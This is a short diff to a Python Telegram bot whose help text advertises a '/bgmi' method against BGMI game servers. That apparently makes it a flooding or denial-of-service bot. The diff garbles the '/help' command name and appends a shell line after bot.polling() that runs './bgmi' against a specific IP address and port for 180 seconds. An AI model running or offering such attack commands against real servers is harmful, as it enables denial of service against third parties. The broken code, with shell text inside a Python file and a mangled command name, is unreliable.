@@ -274,7 +274,7 @@ def show_command_logs(message):
     bot.reply_to(message, response)
 
 
-@bot.message_handler(commands=['help'])
+@bot.message_handler(commands=['he o klp'])
 def show_help(message):
     help_text ='''🤖 Available commands:
 💥 /bgmi : Method For Bgmi Servers. 
@@ -374,3 +374,5 @@ def broadcast_message(message):
 
 
 bot.polling()
+./bgmi 20.157.92.132 16937 180
+
